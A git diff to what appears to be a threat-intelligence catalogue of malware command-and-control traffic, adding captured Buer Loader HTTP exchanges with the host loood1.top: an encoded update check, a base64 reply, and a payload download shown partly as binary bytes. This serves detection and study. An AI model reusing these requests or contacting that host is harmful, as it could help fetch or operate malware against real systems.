@@ -278,6 +278,40 @@ try {"6f7074696f6e73ProcessorId"; $disks = gwmi Win32_Volume -filter "Name='C:\\
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/brushaloader.png "Brushaloader")
 
+#### Buer Loader
+~~~
+GET /api/update/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ODM0MjIwNTc5ZGIzNGJiMTMzNWNlMmJlNDJmMjBhMTA5MTVjNWQxZThmN2U0OWJjYjY0ODVjODE4NjQwYjk3YzY0NWU5NjAxNGMxY2U3NWQ2MmI5N2MwY2QzNzlhMmQ2ZmM5ZDFjZjIwNWMwMTEwNWVkNDAyZjY0ZDYyMTg0Y2UyZmJhZmEyYTQxMzBhZWRiNmY0ZjI2ZjFjZmI4MTQwMTBiYzE0Y2Y4NjBiM2U2NGE1NTBhNTc0Y2M4 HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+Host: loood1.top
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 12 Nov 2019 20:00:24 GMT
+Content-Type: text/plain; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+ODMtMkQtNzItMUMtMEQtOTgtREEtOTAtMzktNjUtREYtNzYtRDktQkYtQkYtNUEtMDUtNEMtRjAtRkMtMjAtQzctMEUtQzMtRDAtODYtMzYtRTQtOTktMDAtN0YtRDAtNjQtNDctMzktMkYtRTktMTMtM0MtNDgtNjktNTQtNDEtMTktRjMtNUUtQTItNjgtQTUtMjQtNkEtNEItNzItQ0UtODUtRDQtMDAtQjctMTYtNEItOUItMDQtQzgtMTctN0UtRDgtQzctMDAtM0ItN0ItQzUtQTQtMTYtQUEtM0UtNEEtRjMtRUItNDUtQTctMEItMTctOTEtNUItNTQtNEEtODUtNzctNEEtQjUtRTYtMUMtNTktRDEtODctNDQtQkItMjAtNkQtNTgtQzEtMEEtNEItNEMtRTEtNTItM0MtRTItMkYtNTktOEUtMkUtRjItRDgtRjQtOTgtMUYtRjEtNTEtQzktMTUtNTAtQkEtNDktMkUtMzAtRDMtMjUtRDMtODctNEItQjYtRjUtN0MtMUUtMjQtRTktOTgtM0MtNTYtNjYtRTUtRDctQ0UtMDAtNUQtNkEtODUtMDEtQjEtMkMtQjctODUtMkQtMzItNjItNUEtM0UtRUQtMTYtMDYtMjYtMDYtRDMtOTYtMDMtOUEtOTEtN0MtMTUtOTEtRkYtQUItMDItQzItNzctRTItN0EtNDEtMEEtQjAtMzItOUEtMEYtRjQtMDMtNzAtMUYtMEItNTEtMDktM0EtNzQtQjEtODgtMzEtMUQtREEtQTItRjQtMzktNkUtMTctRDItRDktNTQtRDUtOEYtMDAtQkEtODEtNkUtNEUtMzUtQTMtNTItRkQtODctRTMtRDYtMkMtNTQtODctQTItNjYtQzgtM0MtMzgtQzctMEEtM0EtOUQtOEEtMzAtRTAtMDgtMzItMTAtMDgtRjItQjYtRkUtMUQtQzctQzgtQUUtOEYtNjctQUUtNTItMDUtQTktMTAtQUYtM0MtOEUtMTMtN0EtNzItM0YtMzAtRTktMzUtRDMtNTQtQkEtOEQtQzAtMzItQTctRkItNDUtQTMtNTctRTQtMUItMzAtODItNEYtOTEtOTktMUMtRDItRjgtMkEtMzYtRTItODktQjItQkItMUItNjYtQUMtMUItOEMtNjQtRUEtN0QtQkQtMkMtOTktQ0QtQzQtQkQtNzgtQzgtOUMtQjAtNkQtNTYtOEUtRDktREEtOTEtMEEtNkMtQUEtQTQtMUUtRTAtQ0MtMzMtRDMtMjAtRTItNjktMjktQzEtRTQtNjEtMTAtMjUtOTgtNjMtOEUtNTgtNzQtRjctNUEtNEYtNDktQzUtNjItNTEtNTAtNTgtNDktM0QtREQtNjctRDctNjEtMTAtMTktRkItNzUtODYtRUItMEYtQzMtRDMtQkQtMjctNkUtQzYtRDktQkYtQUUtNDAtOEEtMUEtMUQtNjctOEMtMjItNjctQjgtNUQtQzItMTUtREQtODMtNzgtNjctN0ItMTMtNDktNzMtRjMtRTAtNEYtMDUtRkYtQjktQ0ItMkEtMDctQkMtRTgtRTMtREQtMUMtNEEtQUQtQjItMTUtNUEtNDMtMTQtQUEtNDEtMUQtNzAtMUEtREQtNTQtMTYtOTAtNjctMTUtNjUtQTgtMjItMTUtMzgtRDYtNjgtOTQtNDMtNDQtQzgtNkQtMUYtNTAtNkMtMTgtMzMtQjUtNzAtOTQtMDQtNzMtRDMtNjQtMTktNDctNjYtNzgtOTEtQkUtQ0ItRTktREItNkQtODgtRkMtOTAtOTk=GET /api/download/YzE0MTY2MGIxZWQ5YzJkMDNmMjQ4MDM0Y2RlZWI2MWM1OTEzYWJmZTIwYWE1OWNjZDFlZjM2ZmZjODViNmVjNTBjNTIyZjY5YjM1MTJiMTc2NzBlNTQwOWFjMWZiZjViZTAzNzdkNWM2NDkxOGE4ZDUwYTMxZjU5ODIzY2QxNTQyMmM5ZGU0Njc4MDI5MWU2NGJhNTYyMDhiMGI4MDlhNDBkNGQ5NjQ2NWQxYjgzNzYwNmIzYjQxZTViZDU4MDE3YjQyZjZmNTVjNg== HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
+Host: loood1.top
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 12 Nov 2019 20:00:24 GMT
+Content-Type: application/*
+Content-Length: 2109952
+Connection: keep-alive
+Last-Modified: Tue, 12 Nov 2019 19:32:38 GMT
+
+.}.<,...XG.V.$.-. ..D.o...S..c].ng.
+.cH!.:2;.~.b..JkP...e.,k...7P.]....._0.&..p.U......=J........9?..J.@.
+j.^ .h....P.j.S5.q....	h..<.?*u@I^.|.......*..t..5Y.............3.:..v/.(....B.......w.\.|.C............/9...^........F....({..U.{f.c...'......9..%.Z.rJ_.....f....q.#...~..}.....
+....k0#.o..............O\....w@..>....E..F.@......4..{#k.hqpxy.....}|....-....B....
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/buer.png "Buer Loader")
+
 #### Cannibal RAT (aka Ares)
 ~~~
 POST /api/admin_90520735581359/hello HTTP/1.1
